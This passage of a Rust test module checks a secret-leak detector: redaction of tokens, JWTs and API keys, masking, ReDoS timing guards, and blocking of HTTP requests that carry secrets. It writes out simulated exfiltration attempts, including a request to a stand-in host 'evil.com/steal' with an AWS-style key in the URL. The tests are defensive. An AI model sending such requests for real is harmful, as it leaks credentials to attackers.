        let content = format!("token: Bearer {header}.{payload}.{signature}");

        let redacted = detector.scan_and_clean(&content).unwrap();

        assert_eq!(redacted, "token: [REDACTED]");
        for forbidden in [header, payload, signature] {
            assert!(
                !redacted.contains(forbidden),
                "redacted bearer JWT leaked token fragment {forbidden}: {redacted}"
            );
        }
    }

    #[test]
    fn test_redact_bearer_token_preserves_adjacent_sentence_boundary() {
        let detector = LeakDetector::new();
        let token = "abcdef1234567890123456";
        let content = format!("prefix Bearer {token}. The next sentence.");

        let redacted = detector.scan_and_clean(&content).unwrap();

        assert_eq!(redacted, "prefix [REDACTED] The next sentence.");
        assert!(!redacted.contains(token));
        assert!(redacted.ends_with("The next sentence."));
    }

    #[test]
    fn test_redact_dotted_opaque_bearer_token_without_fragment_leak() {
        let detector = LeakDetector::new();
        let prefix = "opaquePrefix1234567890";
        let middle = "middle.segment.value";
        let suffix = "opaqueSuffix0987654321";
        let token = format!("{prefix}.{middle}.{suffix}");
        let content = format!("token=Bearer {token}; after token");

        let redacted = detector.scan_and_clean(&content).unwrap();

        assert_eq!(redacted, "token=[REDACTED]; after token");
        for forbidden in [prefix, middle, suffix] {
            assert!(
                !redacted.contains(forbidden),
                "redacted dotted bearer token leaked fragment {forbidden}: {redacted}"
            );
        }
    }

    #[test]
    fn test_scan_and_clean_blocks() {
        let detector = LeakDetector::new();
        let content = "sk-proj-test1234567890abcdefghij";

        let result = detector.scan_and_clean(content);
        assert!(result.is_err());
    }

    #[test]
    fn test_scan_and_clean_passes_clean() {
        let detector = LeakDetector::new();
        let content = "Just regular text";

        let result = detector.scan_and_clean(content);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), content);
    }

    #[test]
    fn redact_all_secrets_masks_block_severity_without_dropping_cause() {
        // The model-visible detail channel must keep the descriptive cause
        // (path, status code) while masking every secret value — even
        // Block-severity tokens that `scan_and_clean` would refuse outright.
        let detector = LeakDetector::new();
        let content = concat!(
            "auth failed at /workspace/config using ghp",
            "_012345678901234567890123456789012345",
            " \
             and AKIAIOSFODNN7EXAMPLE (HTTP 401)"
        );

        let (redacted, changed) = detector.redact_all_secrets(content);

        assert!(
            changed,
            "a leak was present, so redaction must report a change"
        );
        assert!(
            !redacted.contains(concat!("ghp", "_012345678901234567890123456789012345", "")),
            "github token must be redacted: {redacted}"
        );
        assert!(
            !redacted.contains("AKIAIOSFODNN7EXAMPLE"),
            "aws access key must be redacted: {redacted}"
        );
        // Descriptive cause survives so the model can act on it.
        assert!(
            redacted.contains("/workspace/config"),
            "path must survive: {redacted}"
        );
        assert!(
            redacted.contains("HTTP 401"),
            "status code must survive: {redacted}"
        );
        assert!(redacted.contains("[REDACTED]"));
    }

    #[test]
    fn redact_all_matches_masks_block_redact_and_warn_actions() {
        let content = "prefix TEST_SECRET suffix";
        let start = content.find("TEST_SECRET").unwrap();

        for action in [LeakAction::Block, LeakAction::Redact, LeakAction::Warn] {
            let scan = LeakScanResult {
                matches: vec![LeakMatch {
                    pattern_name: "synthetic".to_string(),
                    severity: LeakSeverity::High,
                    action,
                    location: start..start + "TEST_SECRET".len(),
                    masked_preview: "[masked]".to_string(),
                }],
                should_block: action == LeakAction::Block,
                redacted_content: None,
            };

            assert_eq!(
                scan.redact_all_matches(content).unwrap(),
                Some("prefix [REDACTED] suffix".to_string())
            );
        }
    }

    #[test]
    fn redact_all_matches_coalesces_overlaps_and_preserves_disjoint_matches() {
        let content = "aa SECRET_ONE bb SECRET_TWO cc";
        let first_start = content.find("SECRET_ONE").unwrap();
        let second_start = content.find("SECRET_TWO").unwrap();
        let synthetic_match = |location| LeakMatch {
            pattern_name: "synthetic".to_string(),
            severity: LeakSeverity::High,
            action: LeakAction::Redact,
            location,
            masked_preview: "[masked]".to_string(),
        };
        let scan = LeakScanResult {
            matches: vec![
                synthetic_match(first_start..first_start + "SECRET_ONE".len()),
                synthetic_match(first_start + 2..first_start + 6),
                synthetic_match(second_start..second_start + "SECRET_TWO".len()),
            ],
            should_block: false,
            redacted_content: None,
        };

        let redacted = scan
            .redact_all_matches(content)
            .expect("valid detector ranges")
            .expect("matches should be redacted");

        assert_eq!(redacted, "aa [REDACTED] bb [REDACTED] cc");
        assert_eq!(redacted.matches("[REDACTED]").count(), 2);
    }

    #[test]
    fn redact_all_matches_rejects_invalid_scanner_ranges() {
        for location in [0..usize::MAX, 2..2, 3..2] {
            let scan = LeakScanResult {
                matches: vec![LeakMatch {
                    pattern_name: "synthetic".to_string(),
                    severity: LeakSeverity::High,
                    action: LeakAction::Redact,
                    location,
                    masked_preview: "[masked]".to_string(),
                }],
                should_block: false,
                redacted_content: None,
            };

            assert_eq!(
                scan.redact_all_matches("safe"),
                Err(LeakRedactionError::InvalidMatchRange)
            );
        }
    }

    #[test]
    fn redact_all_matches_rejects_non_char_boundary_scanner_ranges() {
        let content = "éx";

        for location in [1..2, 0..1] {
            let scan = LeakScanResult {
                matches: vec![LeakMatch {
                    pattern_name: "synthetic".to_string(),
                    severity: LeakSeverity::High,
                    action: LeakAction::Redact,
                    location,
                    masked_preview: "[masked]".to_string(),
                }],
                should_block: false,
                redacted_content: None,
            };

            assert_eq!(
                scan.redact_all_matches(content),
                Err(LeakRedactionError::InvalidMatchRange)
            );
        }
    }

    #[test]
    fn redact_all_secrets_masks_sandbox_credential_placeholder_without_dropping_context() {
        // Detection of `icsbx_` placeholders is covered elsewhere; this pins
        // that *redaction* actually removes the token value from
        // model-visible output while the surrounding diagnostic context
        // (path, status code) survives — a redaction that nuked the whole
        // string would "pass" a detection-only test while destroying the
        // output's diagnostic value.
        let detector = LeakDetector::new();
        // Realistic shape: registry-generated placeholders are `icsbx_` plus
        // exactly 32 lowercase hex characters (a simple-form UUID).
        let token = "icsbx_0123456789abcdef0123456789abcdef";
        let content = format!("auth failed at /workspace/config using {token} (HTTP 401)");

        let (redacted, changed) = detector.redact_all_secrets(&content);

        assert!(
            changed,
            "a placeholder was present, so redaction must report a change"
        );
        assert!(
            !redacted.contains(token),
            "placeholder token must be redacted: {redacted}"
        );
        assert!(
            redacted.contains("/workspace/config"),
            "path must survive: {redacted}"
        );
        assert!(
            redacted.contains("HTTP 401"),
            "status code must survive: {redacted}"
        );
        assert!(redacted.contains("[REDACTED]"));
    }

    #[test]
    fn redact_all_secrets_leaves_clean_text_untouched() {
        let detector = LeakDetector::new();
        let content = "read_file failed at /workspace/x (HTTP 404)";

        let (redacted, changed) = detector.redact_all_secrets(content);

        assert!(!changed);
        assert_eq!(redacted, content);
    }

    #[test]
    fn redact_all_secrets_masks_bare_jwt() {
        let detector = LeakDetector::new();
        let jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature123";

        let (redacted, changed) = detector.redact_all_secrets(jwt);

        assert!(changed);
        assert_eq!(redacted, "[REDACTED]");
    }

    #[test]
    fn redact_all_secrets_masks_entire_bare_jwt_ending_in_dash() {
        let detector = LeakDetector::new();
        let jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature12-";

        let (redacted, changed) = detector.redact_all_secrets(jwt);

        assert!(changed);
        assert_eq!(redacted, "[REDACTED]");
    }

    #[test]
    fn redact_all_secrets_masks_entire_telegram_token_ending_in_dash() {
        let detector = LeakDetector::new();
        let token = "12345678901:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsa-";

        let (redacted, changed) = detector.redact_all_secrets(token);

        assert!(changed);
        assert_eq!(redacted, "[REDACTED]");
    }

    #[test]
    fn oversized_bare_jwt_candidate_fails_closed_without_decoding() {
        let detector = LeakDetector::new();
        let candidate = format!(
            "{}.payload12.signature12-",
            "A".repeat(MAX_BARE_JWT_CANDIDATE_LEN + 1)
        );

        let (redacted, changed) = detector.redact_all_secrets(&candidate);

        assert!(changed);
        assert_eq!(redacted, "[REDACTED]");
    }

    #[test]
    fn bare_jwt_detector_accepts_json_header_with_leading_whitespace() {
        let detector = LeakDetector::new();
        // Header decodes to ` {"alg":"HS256"}`. JSON permits leading
        // whitespace, so security classification cannot depend on `eyJ`.
        let jwt = "IHsiYWxnIjoiSFMyNTYifQ.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature123";

        let (redacted, changed) = detector.redact_all_secrets(jwt);

        assert!(changed);
        assert_eq!(redacted, "[REDACTED]");
    }

    #[test]
    fn bare_jwt_detector_allows_long_dotted_package_names() {
        let detector = LeakDetector::new();
        for package_name in [
            "com.fasterxml.jackson",
            "org.springframework.integration.transformer",
        ] {
            let scan = detector.scan(package_name);
            let (redacted, changed) = detector.redact_all_secrets(package_name);

            assert!(
                scan.is_clean(),
                "a dotted package name is not a credential: {:?}",
                scan.matches
            );
            assert!(!changed);
            assert_eq!(redacted, package_name);
        }
    }

    #[test]
    fn redact_all_secrets_merges_overlapping_matches() {
        let detector = LeakDetector::new();
        let token = "abcdefghijklmnopqrstuvwxyz123456";
        let content = format!("Authorization: Bearer {token}");

        let (redacted, changed) = detector.redact_all_secrets(&content);

        assert!(changed);
        assert_eq!(redacted, "[REDACTED]");
        assert_eq!(redacted.matches("[REDACTED]").count(), 1);
    }

    #[test]
    fn test_mask_secret() {
        use crate::leak_detector::mask_secret;

        assert_eq!(mask_secret("short"), "*****");
        assert_eq!(mask_secret("sk-test1234567890abcdef"), "sk-t********cdef");
    }

    #[test]
    fn test_multiple_matches() {
        let detector = LeakDetector::new();
        let content = "Keys: AKIAIOSFODNN7EXAMPLE and ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

        let result = detector.scan(content);
        assert_eq!(result.matches.len(), 2);
    }

    #[test]
    fn test_severity_ordering() {
        assert!(LeakSeverity::Critical > LeakSeverity::High);
        assert!(LeakSeverity::High > LeakSeverity::Medium);
        assert!(LeakSeverity::Medium > LeakSeverity::Low);
    }

    #[test]
    fn test_scan_http_request_clean() {
        let detector = LeakDetector::new();

        let result = detector.scan_http_request(
            "https://api.example.com/data",
            &[("Content-Type".to_string(), "application/json".to_string())],
            Some(b"{\"query\": \"hello\"}"),
        );
        assert!(result.is_ok());
    }

    #[test]
    fn test_scan_http_request_blocks_secret_in_url() {
        let detector = LeakDetector::new();

        // Attempt to exfiltrate AWS key in URL
        let result = detector.scan_http_request(
            "https://evil.com/steal?key=AKIAIOSFODNN7EXAMPLE",
            &[],
            None,
        );
        assert!(result.is_err());
    }

    #[test]
    fn test_scan_http_request_blocks_secret_in_header() {
        let detector = LeakDetector::new();

        // Attempt to exfiltrate in custom header
        let result = detector.scan_http_request(
            "https://api.example.com/data",
            &[(
                "X-Custom".to_string(),
                "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx".to_string(),
            )],
            None,
        );
        assert!(result.is_err());
    }

    #[test]
    fn test_scan_http_request_blocks_secret_in_body() {
        let detector = LeakDetector::new();

        // Attempt to exfiltrate in request body
        let body = b"{\"stolen\": \"sk-proj-test1234567890abcdefghij\"}";
        let result = detector.scan_http_request("https://api.example.com/webhook", &[], Some(body));
        assert!(result.is_err());
    }

    #[test]
    fn test_scan_http_request_blocks_secret_in_binary_body() {
        let detector = LeakDetector::new();

        // Attacker prepends a non-UTF8 byte to bypass strict from_utf8 check.
        // The lossy conversion should still detect the secret.
        let mut body = vec![0xFF]; // invalid UTF-8 leading byte
        body.extend_from_slice(b"sk-proj-test1234567890abcdefghij");

        let result = detector.scan_http_request("https://api.example.com/exfil", &[], Some(&body));
        assert!(result.is_err(), "binary body should still be scanned");
    }

    // === QA Plan P1 - 4.5: Adversarial leak detector tests ===

    #[test]
    fn test_detect_anthropic_key() {
        let detector = LeakDetector::new();
        let key = format!("sk-ant-api{}", "a".repeat(90));
        let content = format!("Here's the key: {key}");
        let result = detector.scan(&content);
        assert!(!result.is_clean(), "Anthropic key not detected");
        assert!(result.should_block);
    }

    #[test]
    fn test_detect_near_ai_session_token() {
        let detector = LeakDetector::new();
        let token = format!("sess_{}", "a".repeat(32));
        let content = format!("token: {token}");
        let result = detector.scan(&content);
        assert!(!result.is_clean(), "NEAR AI session token not detected");
    }

    #[test]
    fn test_detect_stripe_key() {
        let detector = LeakDetector::new();
        // Build at runtime to avoid GitHub push protection false positive.
        let content = format!("sk_{}_aAbBcCdDfFgGhHjJkKmMnNpPqQ", "live");
        let result = detector.scan(&content);
        assert!(!result.is_clean(), "Stripe key not detected");
    }

    #[test]
    fn test_detect_ssh_private_key() {
        let detector = LeakDetector::new();
        let content = "-----BEGIN OPENSSH PRIVATE KEY-----\nbase64data==";
        let result = detector.scan(content);
        assert!(!result.is_clean(), "SSH private key not detected");
    }

    #[test]
    fn test_detect_slack_token() {
        let detector = LeakDetector::new();
        let content = "xoxb-1234567890-abcdefghij";
        let result = detector.scan(content);
        assert!(!result.is_clean(), "Slack token not detected");
    }

    #[test]
    fn test_secret_at_different_positions() {
        let detector = LeakDetector::new();
        let key = "AKIAIOSFODNN7EXAMPLE";

        // At start
        let result = detector.scan(key);
        assert!(!result.is_clean(), "key at start not detected");

        // In middle
        let result = detector.scan(&format!("prefix text {key} suffix text"));
        assert!(!result.is_clean(), "key in middle not detected");

        // At end
        let result = detector.scan(&format!("end: {key}"));
        assert!(!result.is_clean(), "key at end not detected");
    }

    #[test]
    fn test_multiple_different_secret_types() {
        let detector = LeakDetector::new();
        let content = format!(
            "AWS: AKIAIOSFODNN7EXAMPLE and GitHub: ghp_{}",
            "x".repeat(36)
        );
        let result = detector.scan(&content);
        assert!(
            result.matches.len() >= 2,
            "expected 2+ matches for different secret types, got {}",
            result.matches.len()
        );
    }

    #[test]
    fn test_mask_secret_short_value() {
        use crate::leak_detector::mask_secret;
        // Short secrets (<= 8 chars) should be fully masked
        assert_eq!(mask_secret("abc"), "***");
        assert_eq!(mask_secret(""), "");
        assert_eq!(mask_secret("12345678"), "********");
        // 9-char string shows first 4 + last 4 with one star in middle
        assert_eq!(mask_secret("123456789"), "1234*6789");
    }

    #[test]
    fn test_clean_text_not_flagged() {
        let detector = LeakDetector::new();
        // Common text that might look suspicious but isn't a real secret
        let clean_texts = [
            "The API returns a JSON response",
            "Use ssh to connect to the server",
            "Bearer authentication is required",
            "sk-this-is-too-short",
            "The key concept is immutability",
        ];
        for text in clean_texts {
            let result = detector.scan(text);
            // Should not block (may warn on some patterns, but not block)
            assert!(!result.should_block, "clean text falsely blocked: {text}");
        }
    }

    // ── OpenRouter, Anthropic OAuth, Telegram, Groq patterns ────────

    #[test]
    fn test_detect_openrouter_key() {
        let detector = LeakDetector::new();
        // Synthetic key — 64 hex chars after prefix
        let content =
            "LLM_API_KEY=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";
        let result = detector.scan(content);
        assert!(result.should_block, "OpenRouter key not detected");
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "openrouter_api_key")
        );
    }

    #[test]
    fn test_detect_openrouter_key_in_json() {
        let detector = LeakDetector::new();
        let content =
            r#"{"api_key": "sk-or-v1-aabbccdd00112233445566778899aabbccdd00112233445566"}"#;
        let result = detector.scan(content);
        assert!(result.should_block, "OpenRouter key in JSON not detected");
    }

    #[test]
    fn test_openrouter_short_key_passes() {
        let detector = LeakDetector::new();
        let content = "sk-or-v1-abc123";
        let result = detector.scan(content);
        assert!(
            !result.should_block,
            "Short OpenRouter-like string falsely blocked"
        );
    }

    #[test]
    fn test_detect_anthropic_oauth() {
        let detector = LeakDetector::new();
        // Synthetic token — 90+ base64url chars after prefix
        let content = "token=sk-ant-oat01-aaaBBBcccDDDeeeFFF111222333444555666777888999000aaaBBBcccDDDeeeFFF111222333444555666";
        let result = detector.scan(content);
        assert!(result.should_block, "Anthropic OAuth token not detected");
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "anthropic_oauth_token")
        );
    }

    #[test]
    fn test_detect_telegram_bot_token() {
        let detector = LeakDetector::new();
        // Synthetic token — fake bot ID and token
        let content = "TELEGRAM_BOT_TOKEN=12345678901:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw";
        let result = detector.scan(content);
        assert!(result.should_block, "Telegram bot token not detected");
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "telegram_bot_token")
        );
    }

    #[test]
    fn test_telegram_short_id_passes() {
        let detector = LeakDetector::new();
        let content = "123:AAFoo";
        let result = detector.scan(content);
        assert!(
            !result
                .matches
                .iter()
                .any(|m| m.pattern_name == "telegram_bot_token"),
            "Short bot ID falsely matched Telegram pattern"
        );
    }

    #[test]
    fn test_detect_groq_key() {
        let detector = LeakDetector::new();
        // Synthetic key — 56 alphanumeric chars after prefix
        let content = "GROQ_API_KEY=gsk_aaaBBBcccDDDeeeFFF111222333444555666777888999000aaaBBBcc";
        let result = detector.scan(content);
        assert!(result.should_block, "Groq API key not detected");
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "groq_api_key")
        );
    }

    #[test]
    fn test_groq_short_key_passes() {
        let detector = LeakDetector::new();
        let content = "gsk_abc";
        let result = detector.scan(content);
        assert!(
            !result
                .matches
                .iter()
                .any(|m| m.pattern_name == "groq_api_key"),
            "Short Groq-like string falsely matched"
        );
    }

    #[test]
    fn test_scan_and_clean_blocks_openrouter() {
        let detector = LeakDetector::new();
        let content =
            "key=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";
        assert!(
            detector.scan_and_clean(content).is_err(),
            "scan_and_clean should block OpenRouter key"
        );
    }

    #[test]
    fn test_scan_and_clean_blocks_telegram() {
        let detector = LeakDetector::new();
        let content = "12345678901:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw";
        assert!(
            detector.scan_and_clean(content).is_err(),
            "scan_and_clean should block Telegram token"
        );
    }

    #[test]
    fn test_detect_sandbox_credential_placeholder() {
        let detector = LeakDetector::new();
        let content = "found in ~/.git-credentials: icsbx_7f3a9b2c1d4e5f60";
        let result = detector.scan(content);
        assert!(result.should_block, "sandbox placeholder not detected");
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "sandbox_credential_placeholder")
        );
    }

    #[test]
    fn test_sandbox_credential_placeholder_short_suffix_passes() {
        let detector = LeakDetector::new();
        let content = "icsbx_ab";
        let result = detector.scan(content);
        assert!(
            !result
                .matches
                .iter()
                .any(|m| m.pattern_name == "sandbox_credential_placeholder"),
            "short suffix should not match placeholder pattern"
        );
    }

    #[test]
    fn test_sandbox_credential_placeholder_substring_of_longer_word_is_flagged() {
        // Deliberately flipped from "should not match" to "should match":
        // the pattern has no `\b` word boundaries (see the comment on the
        // pattern definition), so a single leading/trailing character next
        // to `icsbx_` no longer defeats detection. Over-matching here is the
        // intended fail-safe behavior — a leaked placeholder embedded in a
        // longer identifier must still be caught.
        let detector = LeakDetector::new();
        let content = "myicsbx_7f3a9b2c1d4e5f60prefix";
        let result = detector.scan(content);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "sandbox_credential_placeholder"),
            "icsbx_ substring inside a longer word must still be flagged (fail-safe over-match)"
        );
    }

    #[test]
    fn test_sandbox_credential_placeholder_leading_underscore_is_flagged() {
        // A single leading `_` used to defeat the old `\bicsbx_...\b`
        // pattern outright, since `_` is a word character and `\b` does not
        // fire next to it.
        let detector = LeakDetector::new();
        let content = "_icsbx_0123456789abcdef0123456789abcdef";
        let result = detector.scan(content);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "sandbox_credential_placeholder"),
            "leading underscore must not defeat placeholder detection"
        );
    }

    #[test]
    fn test_sandbox_credential_placeholder_trailing_underscore_is_flagged() {
        let detector = LeakDetector::new();
        let content = "icsbx_0123456789abcdef0123456789abcdef_x";
        let result = detector.scan(content);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "sandbox_credential_placeholder"),
            "trailing underscore must not defeat placeholder detection"
        );
    }

    #[test]
    fn test_sandbox_credential_placeholder_leading_letter_is_flagged() {
        let detector = LeakDetector::new();
        let content = "xicsbx_0123456789abcdef0123456789abcdef";
        let result = detector.scan(content);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "sandbox_credential_placeholder"),
            "leading letter must not defeat placeholder detection"
        );
    }

    #[test]
    fn test_scan_and_clean_blocks_sandbox_credential_placeholder() {
        let detector = LeakDetector::new();
        let content = "icsbx_7f3a9b2c1d4e5f60";
        assert!(
            detector.scan_and_clean(content).is_err(),
            "scan_and_clean should block sandbox credential placeholder"
        );
    }

    #[test]
    fn sandbox_credential_placeholder_prefix_matches_registry() {
        // `ironclaw_safety` deliberately does not take `ironclaw_secrets` as a
        // normal dependency just to share the "icsbx_" prefix constant (it
        // stays a dependency-light substrate). This dev-dependency-only test
        // is the regression net instead: if the prefix is ever rotated in
        // `ironclaw_secrets::placeholder::CREDENTIAL_PLACEHOLDER_PREFIX`
        // without updating the hardcoded regex literal above, this fails
        // loudly instead of the leak detector silently going stale.
        assert_eq!(
            ironclaw_secrets::CREDENTIAL_PLACEHOLDER_PREFIX,
            "icsbx_",
            "leak_detector's sandbox_credential_placeholder regex hardcodes 'icsbx_'; \
             update both if this constant ever changes"
        );

        // Pin the length half of the shared contract too, not just the
        // prefix: the regex requires 16+ alphanumeric characters after the
        // prefix (`{16,}`), so the registry's own required suffix length must
        // never drop below that floor, or shorter-but-valid placeholders
        // would silently stop matching.
        const {
            assert!(
                ironclaw_secrets::CREDENTIAL_PLACEHOLDER_SUFFIX_LEN >= 16,
                "leak_detector's sandbox_credential_placeholder regex requires 16+ alphanumeric \
                 characters after the prefix; the registry's required suffix length must stay at \
                 or above that floor"
            );
        }

        // Better than asserting a bare number: construct a minimum-shaped
        // token through the registry's own public API (not just a literal
        // matching today's expected length) and assert the detector actually
        // flags it. This pins behavior, not a number.
        let minimum_shaped_token = ironclaw_secrets::CredentialPlaceholderToken::parse(format!(
            "{}{}",
            ironclaw_secrets::CREDENTIAL_PLACEHOLDER_PREFIX,
            "a".repeat(ironclaw_secrets::CREDENTIAL_PLACEHOLDER_SUFFIX_LEN)
        ))
        .expect("a suffix of exactly CREDENTIAL_PLACEHOLDER_SUFFIX_LEN alphanumeric characters must be accepted by the registry's own public API");
        let detector = LeakDetector::new();
        let result = detector.scan(&format!("leaked token: {minimum_shaped_token}"));
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "sandbox_credential_placeholder"),
            "a minimum-shaped, registry-accepted placeholder token must be caught by the leak detector"
        );

        // Shape a registry-issued token actually has: the fixed prefix plus a
        // UUIDv4 `simple()` suffix (32 lowercase hex chars, no dashes) — see
        // `CredentialPlaceholderToken::generate()` in ironclaw_secrets.
        let token = format!(
            "{}{}",
            ironclaw_secrets::CREDENTIAL_PLACEHOLDER_PREFIX,
            "0123456789abcdef0123456789abcdef"
        );
        let detector = LeakDetector::new();
        let result = detector.scan(&format!("leaked token: {token}"));
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "sandbox_credential_placeholder"),
            "a realistically-shaped registry-issued placeholder token must be caught"
        );
    }

    /// Adversarial tests for leak detector regex patterns and masking.
    /// See <https://github.com/nearai/ironclaw/issues/1025>.
    mod adversarial {
        use crate::leak_detector::{LeakDetector, mask_secret};

        // ── A. Regex backtracking / performance guards ───────────────

        #[test]
        fn openai_key_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "sk-" followed by almost enough chars but periodically
            // broken by spaces to prevent full match.
            let chunk = "sk-abcdefghij1234567 ";
            let payload = chunk.repeat(5000);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "openai_key pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn high_entropy_hex_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: 63-char hex strings (1 short of the 64-char boundary)
            let chunk = format!("{} ", "a".repeat(63));
            let payload = chunk.repeat(1600);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "high_entropy_hex pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn bearer_token_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // "Bearer " followed by short strings (< 20 chars)
            let chunk = "Bearer shorttoken123 ";
            let payload = chunk.repeat(5000);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "bearer_token pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn authorization_header_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "authorization: " with short value (< 20 chars)
            let chunk = "authorization: Bearer short12345 ";
            let payload = chunk.repeat(3200);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "authorization pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn anthropic_key_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "sk-ant-api" followed by short string (< 90 chars)
            let chunk = "sk-ant-api-shortkey12345 ";
            let payload = chunk.repeat(4200);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "anthropic_api_key pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn aws_access_key_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "AKIA" followed by short string (< 16 chars)
            let chunk = "AKIA12345678 ";
            let payload = chunk.repeat(8500);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "aws_access_key pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn github_token_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "ghp_" followed by short string (< 36 chars)
            let chunk = "ghp_shorttoken12345 ";
            let payload = chunk.repeat(5200);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "github_token pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn github_fine_grained_pat_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "github_pat_" followed by short string (< 22 chars)
            let chunk = "github_pat_shortval12 ";
            let payload = chunk.repeat(4800);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "github_fine_grained_pat pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn stripe_key_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "sk_live_" followed by short string (< 24 chars)
            let chunk = "sk_live_short12345 ";
            let payload = chunk.repeat(5500);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "stripe_api_key pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn nearai_session_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "sess_" followed by short string (< 32 chars)
            let chunk = "sess_shorttoken12 ";
            let payload = chunk.repeat(5800);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "nearai_session pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn pem_private_key_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "-----BEGIN " without "PRIVATE KEY-----"
            let chunk = "-----BEGIN RSA PUBLIC KEY-----\n";
            let payload = chunk.repeat(3500);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "pem_private_key pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn ssh_private_key_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "-----BEGIN OPENSSH " without "PRIVATE KEY-----"
            let chunk = "-----BEGIN OPENSSH PUBLIC KEY-----\n";
            let payload = chunk.repeat(3000);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "ssh_private_key pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn google_api_key_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "AIza" followed by short string (< 35 chars)
            let chunk = "AIza_short12345 ";
            let payload = chunk.repeat(6700);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
